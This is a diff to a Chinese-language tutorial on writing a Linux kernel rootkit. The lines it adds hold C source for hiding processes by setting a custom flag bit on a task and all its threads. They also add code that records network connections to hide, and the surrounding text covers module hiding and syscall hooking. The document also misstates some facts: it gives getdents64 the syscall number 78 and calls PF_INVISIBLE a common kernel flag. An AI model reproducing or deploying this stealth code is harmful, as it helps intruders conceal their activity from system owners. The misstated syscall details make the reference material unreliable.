@@ -293,6 +293,103 @@ void module_hide(void)
 ```
 
 
+隐藏进程。设置或清除指定进程及其线程的标志位,具体功能如下
+
+
+- 锁定 RCU 读锁，查找并获取指定 PID 对应的任务结构。
+- 如果找到任务结构，遍历该任务及其所有线程，根据参数 set 设置或清除标志位。
+
+在 Linux 中，task_struct->flags 常见的标志位包括：PF_INVISIBLE：标记进程为“不可见”，通常用于隐藏进程。
+PF_EXITING：表示进程正在退出。PF_FORKNOEXEC：表示进程已 fork 但尚未 exec。
+
+
+
+```bash
+#define FLAG 0x80000000
+
+struct tgid_iter {
+	unsigned int tgid;
+	struct task_struct *task;
+};
+
+
+static inline int is_task_invisible(struct task_struct *task)
+{
+	return task->flags & FLAG;
+}
+
+
+int flag_tasks(pid_t pid, int set)
+{
+	int ret = 0;
+	struct pid *p;
+
+	rcu_read_lock();
+	p = find_get_pid(pid);
+	if (p) {
+		struct task_struct *task = get_pid_task(p, PIDTYPE_PID);
+		if (task) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
+			struct task_struct *t = NULL;
+
+			for_each_thread(task, t)
+			{
+				if (set)
+					t->flags |= FLAG;
+				else
+					t->flags &= ~FLAG;
+
+				ret++;
+			}
+#endif
+			if (set)
+				task->flags |= FLAG;
+			else
+				task->flags &= ~FLAG;
+
+			put_task_struct(task);
+		}
+		put_pid(p);
+	}
+	rcu_read_unlock();
+	return ret;
+}
+
+```
+
+
+隐藏网络连接。具体功能如下：
+
+- 分配内存创建一个隐藏连接结构体。
+- 将传入的地址信息赋值给新创建的结构体。
+- 将新创建的结构体添加到隐藏连接列表中。
+
+```bash
+
+struct hidden_conn {
+	struct sockaddr_in addr;
+	struct list_head list;
+};
+
+struct list_head hidden_conn_list;
+
+void network_hide_add(struct sockaddr_in addr)
+{
+    struct hidden_conn *hc;
+
+    hc = kmalloc(sizeof(*hc), GFP_KERNEL);
+
+	if (!hc)
+	    return;
+
+	hc->addr = addr;
+    list_add(&hc->list, &hidden_conn_list);
+}
+
+
+```
+
+
 
 ##### 怎么HOOK与HOOK哪些函数
 
@@ -425,31 +522,31 @@ int protect_proc_init() {
 ```bash
 open：打开文件。
 宏定义：__NR_open
-调用号示例（x86_64）：2
+调用号（x86_64）：2
 
 read：从文件读取数据。
 宏定义：__NR_read
-调用号示例（x86_64）：0
+调用号（x86_64）：0
 
 unlink：删除文件。
 宏定义：__NR_unlink
-调用号示例（x86_64）: 87
+调用号（x86_64）: 87
 
 getdents64：读取目录内容（64位版本）。
 宏定义：__NR_getdents64
-调用号示例（x86_64）: 78
+调用号（x86_64）: 78
 
 kill：发送信号给进程。
 宏定义：__NR_kill
-调用号示例（x86_64）：62
+调用号（x86_64）：62
 
 connect：发起连接请求。
 宏定义：__NR_connect
-调用号示例（x86_64）: 42
+调用号（x86_64）: 42
 
 execve：执行新程序。
 宏定义：__NR_execve
-调用号示例（x86_64）：59
+调用号（x86_64）：59
 
 ```
  
